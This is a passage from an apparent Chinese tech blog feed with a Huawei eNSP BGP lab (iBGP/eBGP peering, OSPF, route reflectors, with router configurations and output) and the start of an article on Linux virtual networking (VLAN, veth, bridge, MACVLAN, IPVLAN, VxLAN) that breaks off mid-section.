<p>BGP使用<strong>TCP</strong>为传输层协议，TCP端口号<strong>179</strong>。路由器之间的BGP会话<strong>基于TCP连接而建立</strong>。运行BGP的路由器被称为BGP发言者（BGP Speaker），或BGP路由器。两个建立BGP会话的路由器互为对等体（或称通信对端/对等实体，peer）。BGP对等体之间交换BGP路由表。</p>
<p>BGP路由器只发送增量的BGP路由更新，或进行触发更新（不会周期性更新）。</p>
<p>BGP具有丰富的路径属性和强大的路由策略工具。</p>
<p>BGP能够承载大批量的路由前缀，用于大规模的网络中。</p>
<h3 id="ibgp-and-ebgp">IBGP And EBGP</h3>
<p><strong>同一个AS自治系统中的两个或多个对等实体之间运行的BGP被称为iBGP</strong>（Internal/Interior BGP）。归属<strong>不同的AS的对等实体之间运行的BGP称为eBGP</strong>（External/Exterior BGP）。在AS边界上与其他AS交换信息的路由器被称作边界路由器（border/edge router），边界路由器之间互为eBGP对端。</p>
<p>iBGP和eBGP的区别主要在于转发路由信息的行为。例如，从eBGP peer获得的路由信息会分发给所有iBGP peer和eBGP peer，但从iBGP peer获得的路由信息仅会分发给所有eBGP peer。所有的iBGP peer之间需要全互联。</p>
<p><strong>总结</strong></p>
<p>IBGP（Internal BGP）：位于相同自治系统的BGP路由器之间的BGP邻接关系。</p>
<ul>
<li>
<p>两台路由器之间要建立IBGP对等体关系，必须满足两个条件：</p>
</li>
<li>
<p>两个路由器所属AS需相同（也即AS号相同）。</p>
</li>
<li>
<p>在配置BGP时，Peer命令所指定的对等体IP地址要求路由可达，并且TCP连接能够正确建立</p>
</li>
</ul>
<p>EBGP（External BGP）：位于不同自治系统的BGP路由器之间的BGP邻接关系。</p>
<ul>
<li>
<p>两台路由器之间要建立EBGP对等体关系，必须满足两个条件：</p>
</li>
<li>
<p>两个路由器所属AS不同（也即AS号不同）。</p>
</li>
<li>
<p>在配置BGP时，Peer命令所指定的对等体IP地址要求路由可达，并且TCP连接能够正确建立.</p>
</li>
</ul>
<h3 id="实验配置bgp">实验：配置BGP</h3>
<p>R1、R2及R3属于AS 123，R4属于AS 400；</p>
<p>AS123内的R1、R2及R3运行OSPF，通告各自直连接口（包括三台设备的Loopback0接口），注
意OSPF域的工作范围；所有设备的Loopback0接口地址为 <code>x.x.x.x/32</code>，其中x为设备编号（如R1的接口地址为 <code>1.1.1.1/32</code>）。</p>
<p>R3与R4之间建立EBGP对等体关系，R2暂时不运行BGP，R1与R3之间建立IBGP对等体关系，
所有的BGP对等体关系基于直连接口建立；R4将直连路由<code>4.4.4.4/32</code>通告到BGP，要求R1能学习到
BGP路由<code>4.4.4.4/32</code>；</p>
<p>修改BGP配置，使得R1与R3基于Loopback0接口建立IBGP对等体关系</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025173238524.png" alt="image-20221025173238524"  /></p>
<p>[eNSP BGP实验](<a href="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/basic">https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/basic</a> bgp.zip)</p>
<p><strong>配置ospf</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ospf router-id 1.1.1.1
</span></span><span class="line"><span class="cl">area <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 这里声明的路由为单独的，否则声明全部的会使用ospf学到对应的路由</span>
</span></span><span class="line"><span class="cl">network 10.0.0.0 255.255.255.0
</span></span><span class="line"><span class="cl"><span class="c1"># 这里通过的L0接口进行bgp链接的，所以需要声明该路由。否则ospf学习不到无法链接</span>
</span></span><span class="line"><span class="cl">network 1.1.1.1 255.255.255.255
</span></span><span class="line"><span class="cl"><span class="o">[</span>R1-ospf-1-area-0.0.0.0<span class="o">]</span>dis this
</span></span><span class="line"><span class="cl"><span class="o">[</span>V200R003C00<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"> area 0.0.0.0 
</span></span><span class="line"><span class="cl">  network 0.0.0.0 255.255.255.255 
</span></span></code></pre></td></tr></table>
</div>
</div><p>配置bgp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bgp <span class="m">123</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 设置route-id</span>
</span></span><span class="line"><span class="cl">router-id 1.1.1.1
</span></span><span class="line"><span class="cl"><span class="c1"># 自治系统号码为123</span>
</span></span><span class="line"><span class="cl">peer 3.3.3.3 as-number <span class="m">123</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 建立链接的接口使用的L0，如不指定，默认使用出接口做连接。</span>
</span></span><span class="line"><span class="cl">peer 3.3.3.3 connect-interface LoopBack0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 设置另外一个路由器</span>
</span></span><span class="line"><span class="cl">bgp <span class="m">123</span>
</span></span><span class="line"><span class="cl">router-id 3.3.3.3
</span></span><span class="line"><span class="cl">peer 1.1.1.1 as-number <span class="m">123</span> 
</span></span><span class="line"><span class="cl">peer 1.1.1.1 connect-interface LoopBack0
</span></span><span class="line"><span class="cl"><span class="c1"># 声明一个bgp路由</span>
</span></span><span class="line"><span class="cl">network 33.33.33.33 255.255.255.255
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时可以看到对应的路由已经学习到了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>R1<span class="o">]</span>dis bgp routing-table 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> BGP Local router ID is 1.1.1.1 
</span></span><span class="line"><span class="cl"> Status codes: * - valid, &gt; - best, d - damped,
</span></span><span class="line"><span class="cl">               h - history,  i - internal, s - suppressed, S - Stale
</span></span><span class="line"><span class="cl">               Origin : i - IGP, e - EGP, ? - incomplete
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Total Number of Routes: <span class="m">2</span>
</span></span><span class="line"><span class="cl">Network NextHop     MED        LocPrf    PrefVal     Path/Ogn
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">i   4.4.4.4/32     10.2.0.2     <span class="m">0</span>         <span class="m">100</span>        <span class="m">0</span>      400i
</span></span><span class="line"><span class="cl">*&gt;i 33.33.33.33/32 3.3.3.3      <span class="m">0</span>         <span class="m">100</span>        <span class="m">0</span>      i
</span></span></code></pre></td></tr></table>
</div>
</div><p>配置一个ebgp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 这是两个路由器间的bgp配置。因为L0没有对应的互通接口所以使用默认出接口进行链接。</span>
</span></span><span class="line"><span class="cl">peer 10.2.0.1 as-number <span class="m">123</span> <span class="c1"># 与123 as里的bgp形成一个对等实体</span>
</span></span><span class="line"><span class="cl">peer 10.2.0.2 as-number <span class="m">400</span> <span class="c1"># 与400 as里的bgp形成一个对等实体</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 在R4上声明一个路由</span>
</span></span><span class="line"><span class="cl">network 4.4.4.4 255.255.255.255
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dis bgp ip routing-table	
</span></span><span class="line"><span class="cl"><span class="c1"># 在R3上，可以看到通过eBGP学习到的到4.4.4.4的路由</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>R3-bgp<span class="o">]</span>dis ip routing-table 
</span></span><span class="line"><span class="cl">4.4.4.4/32  EBGP    <span class="m">255</span>  <span class="m">0</span>    D   10.2.0.2    GigabitEthernet0/0/1
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>refresh bgp external import </code> 刷新BGP</p>
<h2 id="bgp的rr">BGP的RR</h2>
<p>由于IBGP水平分割的存在，为了保证所有的BGP路由器都能学习到完整的BGP路由，就必须在AS内实现IBGP全互联，这就导致AS内部需要维护大量的BGP连接，从而影响网络性能，路由反射器（Route Reflector，RR）可以“放宽”水平分割原则，解决该问题。</p>
<p>为保证IBGP对等体之间的连通性，需要在IBGP对等体之间建立全连接关系。假设在一个AS内部有n台设备，那么建立的IBGP连接数就为<code>n(n-1)/2</code>。当设备数目很多时，设备配置将十分复杂，而且配置后网络资源和CPU资源的消耗都很大。在IBGP对等体间使用路由反射器可以解决以上问题。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025173307247.png" alt="image-20221025173307247"  /></p>
<blockquote>
<p>BGP反射规则</p>
<p>BGP RR在接收到BGP路由时</p>
<p>如果该路由学习自非Client IBGP对等体，则反射给自己所有的Client；</p>
<p>如果路由学习自Client，则反射给所有非Client IBGP对等体和除了该Client之外的所有Client（华为设备可通过命令关闭RR在Client之间的路由反射行为）；</p>
<p>如果路由学习自EBGP对等体，则发送给所有Client和非Client IBGP对等体。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025173318988.png" alt="image-20221025173318988"  /></p>
</blockquote>
<p>BGP RR的配置</p>
<p>[BGP RouteReflector.zip](<a href="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/BGP">https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/BGP</a> RouteReflector.zip)</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025173332401.png" alt="image-20221025173332401"  /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 进入系统视图</span>
</span></span><span class="line"><span class="cl">system-view 
</span></span><span class="line"><span class="cl"><span class="c1"># 设置路由器的名称</span>
</span></span><span class="line"><span class="cl">sysname R2
</span></span><span class="line"><span class="cl"><span class="c1"># 进入g0/0/0接口</span>
</span></span><span class="line"><span class="cl">in g0/0/0
</span></span><span class="line"><span class="cl">ip address 10.0.0.2 <span class="m">24</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 配置l0口</span>
</span></span><span class="line"><span class="cl">in l0
</span></span><span class="line"><span class="cl">ip address 2.2.2.2 <span class="m">32</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 只有R1需要配置次步骤</span>
</span></span><span class="line"><span class="cl">in g0/0/1
</span></span><span class="line"><span class="cl">ip address 10.1.0.1 <span class="m">24</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 查看接口的信息</span>
</span></span><span class="line"><span class="cl">dis ip in b	
</span></span></code></pre></td></tr></table>
</div>
</div><p>配置ospf</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ospf router-id 1.1.1.1
</span></span><span class="line"><span class="cl">area 0
</span></span><span class="line"><span class="cl">network 1.1.1.1 0.0.0.0
</span></span><span class="line"><span class="cl">network 10.0.0.0 0.0.0.255
</span></span><span class="line"><span class="cl">network 10.1.0.0 0.0.0.255
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bgp <span class="m">123</span>
</span></span><span class="line"><span class="cl"> router-id 1.1.1.1
</span></span><span class="line"><span class="cl"> peer 2.2.2.2 as-number <span class="m">123</span> 
</span></span><span class="line"><span class="cl"> peer 2.2.2.2 connect-interface LoopBack0
</span></span><span class="line"><span class="cl"> peer 3.3.3.3 as-number <span class="m">123</span> 
</span></span><span class="line"><span class="cl"> peer 3.3.3.3 connect-interface LoopBack0
</span></span><span class="line"><span class="cl"> <span class="c1">#</span>
</span></span><span class="line"><span class="cl"> ipv4-family unicast
</span></span><span class="line"><span class="cl">  undo synchronization
</span></span><span class="line"><span class="cl">  peer 2.2.2.2 <span class="nb">enable</span>
</span></span><span class="line"><span class="cl">  peer 2.2.2.2 reflect-client
</span></span><span class="line"><span class="cl">  peer 3.3.3.3 <span class="nb">enable</span>
</span></span><span class="line"><span class="cl">  peer 3.3.3.3 reflect-client
</span></span></code></pre></td></tr></table>
</div>
</div><p>配置路由反射器反射客户端</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 此处是1.1.1.1的配置</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 以1.1.1.1 为中心 指定2.2.2.2为反射客户端 </span>
</span></span><span class="line"><span class="cl">peer 2.2.2.2 reflect-client
</span></span><span class="line"><span class="cl">peer 3.3.3.3 reflect-client
</span></span></code></pre></td></tr></table>
</div>
</div>]]></content:encoded>
    </item>
    
    <item>
      <title>Linux虚拟网络技术</title>
      <link>https://www.oomkill.com/2021/01/virtual-networking/</link>
      <pubDate>Mon, 18 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/virtual-networking/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="overview">Overview</h2>
<p>本文将介绍Kubernetes中使用的相关虚拟网络功能，目的是为了任何无相关网络背景经历的人都可以了解这些技术在kubernetes中式如何应用的。</p>
<h2 id="vlan">VLAN</h2>
<p><em><strong>VLAN</strong></em> (Virtual local area networks)是逻辑上的LAN而不受限于同一物理网络交换机上。同样的VLAN也可以将同一台交换机/网桥下的设备/划分为不同的子网。</p>
<p><em><strong>VLAN</strong></em> 区分的广播域的标准是VLAN ID，此功能是Linux内核3.8中引入的</p>
<p>在Linux中创建一个VLAN</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link add link eth0 name eth0.2 <span class="nb">type</span> vlan id <span class="m">2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="veth-supa-href11asup">VETH <sup><a href="#1">[1]</a></sup></h2>
<p><em><strong>VETH</strong></em> (Virtual Ethernet device)，是一个本地的以太网隧道，创建出的设备是成对的，通常会存在两个名称空间内，例如在docker中创建出的设备一端在root名称空间内，一端被挂在到容器的名称空间内。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/1tOiYnJv7sx0twVBJGX_zgg.png" alt="img"  /></p>
<center>图：veth topology</center>
<center><em>Source：</em>https://medium.com/@arpitkh96/basics-of-container-networking-with-linux-part-1-3a3cdc64c87a</center><br>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link add &lt;p1-name&gt; <span class="nb">type</span> veth peer name &lt;p2-name&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bridge">Bridge</h2>
<h2 id="目的">目的</h2>
<p>Linux <strong>bridge</strong>（又称为网桥、VLAN交换机）是Linux内核中集成的功能，用来做tcp/ip做二层协议交换的设备，虽然是软件实现的，但它与普通的二层物理交换机功能一样。<em><strong>bridge</strong></em>  就是为了解决虚拟机网卡连接问题。可以添加若干个网络设备到 <em><strong>bridge</strong></em> 上作为其接口，添加到 <em><strong>bridge</strong></em> 上的设备被设置为只接受二层数据帧并且转发所有收到的数据包到 <em><strong>bridge</strong></em> 中。</p>
<p>由于 Linux <em><strong>bridge</strong></em> 是二层设备，故数据包是根据MAC地址而不是IP转发的。因此所有协议都可以透明地通过网桥。Linux <em><strong>bridge</strong></em> 广泛用于虚拟机，名称空间等。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/1NZpkyrCpcQMxkUHNsNtFVA.png" alt="img"  /></p>
<center>图：Linux Bridge</center>
<center><em>Source：</em>https://kbespalov.medium.com/linux-linux-bridge-7e0e887edd01</center><br>
<h2 id="macvlan-supa-href22asup">MACVLAN <sup><a href="#2">[2]</a></sup></h2>
<p><em><strong>MACVLAN</strong></em> 允许在一个物理接口创建多个子接口，并且每个子接口都拥有一个随机生成的MAC地址，与IP地址。</p>
<p><em><strong>MACVLAN</strong></em> 中子接口不能与与父接口直接通讯，例如在虚拟化环境中，容器是不能ping通宿主机的IP，如果子接口需要和父接口进行通讯，需要将子接口分配给父接口。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/linux-macvlan.png" alt="Linux macvlan"  /></p>
<center>图：MACVLAN</center>
<center><em>Source：</em>https://hicu.be/bridge-vs-macvlan</center><br>
<p>从 Linux 内核3.0起，MAC已经是linux内核中的一部分。</p>
<ul>
<li>
<p>查看内核是否加载 <code>lsmod | grep macvlan</code></p>
</li>
<li>
<p>加载macvlan模块 <code>modprobe macvlan</code></p>
</li>
<li>
<p>如果需要每次启动时都加载该模块，<code>echo &quot;macvlan&quot; &gt;&gt; /etc/modules</code></p>
</li>
</ul>
<h3 id="macvlan的限制">MACVLAN的限制</h3>
<p>限制：</p>
<ul>
<li>使用MACVLAN技术需要开启网卡的混杂模式</li>
<li>授予NIC支持的MAC数量限制，超出限制会影响性能</li>
<li>MACVLAN不能工作在wireless网络环境中 <sup><a href="#3">[3]</a></sup></li>
</ul>
<h3 id="macvlan的模式">MACVLAN的模式</h3>
<p>MACVLAN又五种类型：</p>
<ul>
<li>Private</li>
<li>VEPA</li>
<li>Bridge</li>
<li>Passthru</li>
<li>Source</li>
</ul>
<h4 id="private-mode">Private mode</h4>
<p>Private模式下的同一物理接口下的子接口将不允许通讯，即使物理设备支持hairpin也不行。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/linux-macvlan-private-mode.png" alt="Macvlan 私有模式"  /></p>
<center>图：MACVLAN Private mod</center>
<center><em>Source：</em>https://hicu.be/bridge-vs-macvlan</center><br>
<blockquote>
<p><em><strong>hairpin</strong></em> 有多个名称，<em><strong>U-turn NAT</strong></em>, <em><strong>NAT loopback</strong></em>，实际上就是一种网络转换，在一个网络中的两个设备使用外部IP进行通讯。在MACVLAN这个例子中，veth1发往veth2的流量通过外部设备switch进行一个回转，这个行为称为为 <em><strong>hairpin turn</strong></em>。从上图也可以看出，是一个U形的转换。</p>
</blockquote>
<h4 id="vpea-mode">VPEA mode</h4>
<p><em><strong>VPEA</strong></em> 将会将来自子接口的通过父接口转发，这将要求物理交换机需要支持 <em><strong>hairpin</strong></em></p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/linux-macvlan-802.1qbg-vepa-mode.png" alt="Macvlan 802.1qbg VEPA 模式"  /></p>
<center>图：MACVLAN VPEA mode</center>
<center><em>Source：</em>https://hicu.be/bridge-vs-macvlan</center><br>
<h4 id="bridge-mode">Bridge mode</h4>
<p><em><strong>Bridge</strong></em> 是指父接口与所有子接口是通过网桥相连的，因为连接在网桥上，不需要学习MAC地址。这也是容器网络中常用到的模式</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/linux-macvlan-bridge-mode.png" alt="Macvlan 桥接模式"  /></p>
<center>图：MACVLAN bridge mode</center>
<center><em>Source：</em>https://hicu.be/bridge-vs-macvlan</center><br>
<h4 id="passthru">Passthru</h4>
<p><em><strong>passthru</strong></em> 是 pass through，由名字也可以得知，是指允许单个VM与物理接口连接。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/linux-macvlan-passthru-mode.png" alt="Macvlan 直通模式"  /></p>
<center>图：MACVLAN passthru mode</center>
<center><em>Source：</em>https://hicu.be/bridge-vs-macvlan</center><br>
<h4 id="source">Source</h4>
<p>这个模式是Linux中的一个 Patch，是流量仅允许被允许的MAC地址列表</p>
<h2 id="ipvlan">IPVLAN</h2>
<p>IPVLAN与MACVLAN类似，只有一个不同的地方是，IPVLAN所有的MAC地址都是一样的，就是使用相同的MAC地址去创建子接口。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/linux-ipvlan.png" alt="Linux Ipvlan"  /></p>
<center>图：IPVLAN</center>
<center><em>Source：</em>https://hicu.be/bridge-vs-macvlan</center><br>
<h3 id="ipvlan-modes">IPVLAN modes</h3>
<p>在使用IPVLAN时，只能选择下面两种模式中的一种，选择后，所有的子节接口将工作在这个模式下。</p>
<h4 id="l2">L2</h4>
<p><em><strong>IPVLAN</strong></em> L2模式与 <em><strong>MACVLAN</strong></em> 的 <em><strong>brigde</strong></em> 模式工作原理很相似，父接口是作为交换机的角色，同一个物理接口上的子接口可以通过父接口来转发数据，而如果要发送数据到其他的网络，报文则会通过父接口的路由转发出去。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/linux-ipvlan-l2-mode.png" alt="Linux Ipvlan - L2 模式"  /></p>
<center>图：IPVLAN L2</center>
<center><em>Source：</em>https://hicu.be/bridge-vs-macvlan</center><br>
<blockquote>
<p>Notes: IPVLAN 是 linux kernel 比较新的特性，linux kernel 3.19 开始支持 ipvlan，但是比较稳定推荐的版本是 &gt;=4.2</p>
</blockquote>
<h4 id="l3">L3</h4>
<p>在 <em><strong>L3</strong></em> 模式下也就是 物理接口 是作为路由器，这种情况下就要求子接口之间需要处在不同子网中才可以。因为广播域是 <em><strong>L2</strong></em> 的，所以 <em><strong>IPVLAN L3</strong></em> 不支持多播和广播。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/linux-ipvlan-l3-mode-1.png" alt="Linux Ipvlan - L3 模式"  /></p>
<center>图：IPVLAN L3</center>
<center><em>Source：</em>https://hicu.be/bridge-vs-macvlan</center><br>
<h3 id="ipvlan与macvlan如何选择">IPVLAN与MACVLAN如何选择</h3>
<ul>
<li>在于<em><strong>MACVLAN</strong></em>在wireless环境中的不友好，wireless选择 <em><strong>IPVLAN</strong></em></li>
<li>对于外部设备有MAC地址限制的，或者混杂模式限制NIC性能</li>
</ul>
<h2 id="vxlan">VxLAN</h2>
<h3 id="vxlan-introduction">VxLAN Introduction</h3>
<p><em><strong>VxLAN</strong></em> (Virtual eXtensible Local Area Network) 是一种 <code>MAC-over-IP</code> 或者称为 UDP隧道机制，本质上来说是使用网络隧道技术将L3网络扩展为一个L2网络。</p>
<h4 id="为什么将-vxlan-视为l2网络呢">为什么将 <em><strong>VxLAN</strong></em> 视为L2网络呢？</h4>
<p>虽说 <em><strong>VxLAN</strong></em> 是将L2的以太网帧封装到UDP报文中（L2 over L4）中，并在L3网络中传输。但是 <em><strong>VxLAN</strong></em> 最终是基于 <em><strong>MAC</strong></em> 地址的二层网络（可以无需路由设备），而不像 <em><strong>IPIP</strong></em> 的隧道技术网络通讯是基于路由的。</p>
<p>下图是一个使用 <em><strong>VxLAN</strong></em> 技术的网络拓扑，整个篮筐部分可以视为一个二层的虚拟交换机，连接的各设备都可以直连。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/download-16615328145948.png" alt="img"  /></p>
<center>图：VXLAN tunneling technology</center>
<center><em>Source：</em>https://support.huawei.com/enterprise/en/doc/EDOC1100086966</center><br>
<h4 id="vni">VNI</h4>
<p><em><strong>VNI</strong></em> (VXLAN Network Identifier) 是类似于VLAN ID的标识符，不同的<em><strong>VNI</strong></em> 之间不能进行二层通讯</p>
<h4 id="vept">VEPT</h4>
<p><em><strong>VTEP</strong></em> (VxLAN tunnel endpoint) 是指数据包封包与解包的实体，<em><strong>VTEP</strong></em> 既可以是一台独立的网络设备，也可以是一个基于软件的虚拟交换机。当源服务器发出包时，会在 <em><strong>VTEP</strong></em> 上封装成 <em><strong>VxLAN</strong></em> 格式的报文；当传送到对端时，会在对端的 <em><strong>VTEP</strong></em> 进行解包</p>
<p>下图是一个VxLAN网络拓扑图，其中建立隧道的两端就是 <em><strong>VTEP</strong></em>，这里的 <em><strong>VTEP</strong></em> 是两台 TOR 交换机，通过两个 <em><strong>VTEP</strong></em> 来对数据包的解封装。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/download-16615321616635.png" alt="img"  /></p>
<center>图：VXLAN network model</center>
<center><em>Source：</em>https://support.huawei.com/enterprise/en/doc/EDOC1100086966</center><br>
<p>下图是Linux <em><strong>VxLAN</strong></em> 类型的网络拓扑，<em><strong>VTEP</strong></em> 可以理解为是一种网络接口，通过该接口与内核功能进行解封包，而实际的流量也是通过物理设备进行传输。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/vxlan%20in%20linux.png" alt="vxlan in linux"  /></p>
<center>图：VxLAN in Linux</center>
<h4 id="preliminary-knowledge-三层分级网络-supa-href44asup">Preliminary knowledge 三层分级网络 <sup><a href="#4">[4]</a></sup></h4>
<h5 id="三层分级网络">三层分级网络?</h5>
<p>思科的三层分级网络(<em><strong>three-layer hierarchical model</strong></em>) 包含三层：</p>
<ul>
<li>核心层 (<em><strong>Core</strong></em>)：网络骨干，提供不同分布层之间的高速连接和最优传送路径</li>
<li>分布层 (<em><strong>distribution</strong></em>) 将连接接入层到核心层，并且实施安全，流量负载和路由相关的策略</li>
<li>接入层 (<em><strong>access</strong></em>) 为用户终端初始网络的接入点。</li>
</ul>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/distribution-layer-diagram-1621937301-ES7wiU19cL.jpg" alt="img"  /></p>
<center>图：three-layer hierarchical model</center>
<center><em>Source：</em>https://community.fs.com/blog/how-to-choose-the-right-distribution-switch.html</center><br>
<h4 id="为什么需要vxlan-supa-href55asup">为什么需要VxLAN <sup><a href="#5">[5]</a></sup></h4>
<p>下图是一个 <em><strong>CSP</strong></em> (Cloud Service Provider ) 的 <em><strong>DC</strong></em> 网络，</p>
<ul>
<li>接入层：48口交换机20个</li>
<li>分布层：两台分布式交换机，共同组成一个虚拟化交换机。默认网关位于分布式交换机中。</li>
<li>核心层：两个核心交换机</li>
</ul>
<blockquote>
<p>Notes：工作在分布层的交换机被称为分布式交换机 (<em><strong>Distribution Switch</strong></em>)，分布式交换机会将来自访问层的流量转发至核心层，并提供一些连接策略。</p>
</blockquote>
